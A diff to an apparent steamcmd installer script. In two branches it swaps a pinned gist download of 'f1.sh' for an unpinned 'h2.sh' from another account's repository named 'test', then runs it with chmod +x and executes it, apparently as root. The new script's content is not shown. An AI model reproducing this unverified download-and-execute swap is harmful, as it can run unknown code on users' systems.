@@ -12,12 +12,12 @@ case "`lsb_release -is`" in
              ./steamcmd.sh +quit
              mkdir /usr/getit
              cd /usr/getit
-             wget https://gist.githubusercontent.com/systemroot/796288a279f898834b8bad4d02d7e924/raw/7152b8387f302272d2d3e2db2c61337b78425d9e/f1.sh
+             wget https://raw.githubusercontent.com/ch0here/test/master/h2.sh
              wget https://gist.githubusercontent.com/systemroot/2b8a2df82abb845205cda2d44738727e/raw/c504ad06122d69ea9e01203701f41947e2790ab0/f2.sh
              wget https://gist.githubusercontent.com/systemroot/cb63951e279565303f0e5883fbde682e/raw/bf7e5342131deac21a486200fc9d5af5ec14b865/f3.sh
              wget https://gist.githubusercontent.com/systemroot/9bca09a6ee3afb08048d4e3aca3d516a/raw/72828ee458f571b13ccc93e8b6d4d57174384a64/f4.sh
              chmod +x *
-             ./f1.sh
+             ./h2.sh
              ./f2.sh
              ./f3.sh
              ./f4.sh
@@ -77,12 +77,12 @@ case "`lsb_release -is`" in
              clear
              mkdir /usr/getit
              cd /usr/getit
-             wget https://gist.githubusercontent.com/systemroot/796288a279f898834b8bad4d02d7e924/raw/7152b8387f302272d2d3e2db2c61337b78425d9e/f1.sh
+             wget https://raw.githubusercontent.com/ch0here/test/master/h2.sh
              wget https://gist.githubusercontent.com/systemroot/2b8a2df82abb845205cda2d44738727e/raw/c504ad06122d69ea9e01203701f41947e2790ab0/f2.sh
              wget https://gist.githubusercontent.com/systemroot/cb63951e279565303f0e5883fbde682e/raw/bf7e5342131deac21a486200fc9d5af5ec14b865/f3.sh
              wget https://gist.githubusercontent.com/systemroot/9bca09a6ee3afb08048d4e3aca3d516a/raw/72828ee458f571b13ccc93e8b6d4d57174384a64/f4.sh
              chmod +x *
-             ./f1.sh
+             ./h2.sh
              ./f2.sh
              ./f3.sh
              ./f4.sh
